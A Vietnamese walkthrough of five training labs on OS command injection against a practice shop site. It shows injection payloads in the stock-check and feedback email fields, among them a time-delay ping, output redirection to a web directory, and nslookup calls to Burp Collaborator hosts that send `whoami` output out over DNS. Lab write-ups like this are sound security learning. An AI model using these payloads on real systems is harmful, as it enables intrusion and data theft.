**Lab: OS command injection, simple case**
![alt text](images/1.png)
Vừa vào thì chúng ta có giao diện của một trang web bán hàng.
![alt text](images/2.png)
Đề bài có nói là lố hổng nằm trong tính năng checkstock kiểm tra req của tính năng này
![alt text](image.png)
Ta thêm vào payload "|whoami" vào req
![alt text](images/5.png)
Res trả về tên của người dùng
![alt text](images/6.png)
Vậy là hoàn thành lab.

-----------------------------------------------------------------



**Lab: Blind OS command injection with time delays**
![alt text](images/7.png)
Đề bài nói đây là một bài Blind OS Command ở tính năng Submit feedback nên ta vào kiểm tra tính năng này luôn 
![alt text](images/8.png)
Sau khi gửi feedback thì ta có req như sau
![alt text](images/9.png)
Để hệ điều hành bị delay 10 giây thì ta dung lệnh "||ping+-c+10+127.0.0.1||". ta thử lần lượt các trường trong req thì phát hiện chỉ trường gmail có tac dụng
![alt text](images/10.png)
![alt text](images/11.png)
Vậy là hoàn thành lab.
-----------------------------------------------------------------
**Lab: Blind OS command injection with output redirection**

![alt text](images/12.png)
Dây tiếp tục là một bài lab Blind OS Command
![alt text](images/13.png)
Các tính năng thì tương tự như bài vừa rồi nhưng đề bài có nói kết quả của lệnh được tiêm vào có thể được ghi vào thư mục /var/www/images/. Bây giờ ta tiêm vào trường gmail payload **||whoami>/var/www/images/out.txt||**
![alt text](images/14.png)
Tiếp theo ta chỉ cần gửi req để xem file out.txt
![alt text](images/15.png)
Vậy là hoang thành lab
![alt text](images/16.png)
-----------------------------------------------------------------
**Lab: Blind OS command injection with out-of-band interaction**
![alt text](images/17.png)
Bài này lại là trang web như vậy nhưng đề bài yêu cầu ta tìm địa chỉ  ip của Burp Collaborator. Vì vậy payload của bài này sẽ là một lệnh nslookup **||nslookup+x.bixs3kzu9t5dfyzdr14szhn9s0yrmha6.oastify.com||**
![alt text](images/18.png)
Có vẻ như đề bài chỉ yêu cầu chúng ta tiêm thành công chứ không cần kết quả cụ thể đẻ hoàn thành lab
![alt text](images/19.png)
-----------------------------------------------------------------
**Lab: Blind OS command injection with out-of-band data exfiltration**
![alt text](images/20.png)
Bài tiếp tục yêu cầu chúng ta tương tác vói Burp Collaborator nhưng lần này đề bài yêu cầu tiên lệnh **whoami** tới Burp Collaborator
![alt text](images/21.png)
Vẫn là trang web quen thuộc nhưng lần này đã có thên phần Submit solution để ta điền đáp án
![alt text](images/22.png)
Vì phải lấy kết quả thông qua truy vấn DNS đến Burp Collaborator nên payload lần này vẫn dùng đến nslookup : **||nslookup+`whoami`.389ktcpmzlv55qp5htukp9d1isojcb00.oastify.com||**
![alt text](images/23.png)
Req đã gửi thành công ta chuyển sang tab Collaborator đẻ kiểm tra kết quả
![alt text](images/24.png)
Ta thấy được tên user của Burp Collaborator là `peter-0RB5gH`
việc còn lại là điền đáp án để hoàn thành bài lab
![alt text](images/25.png)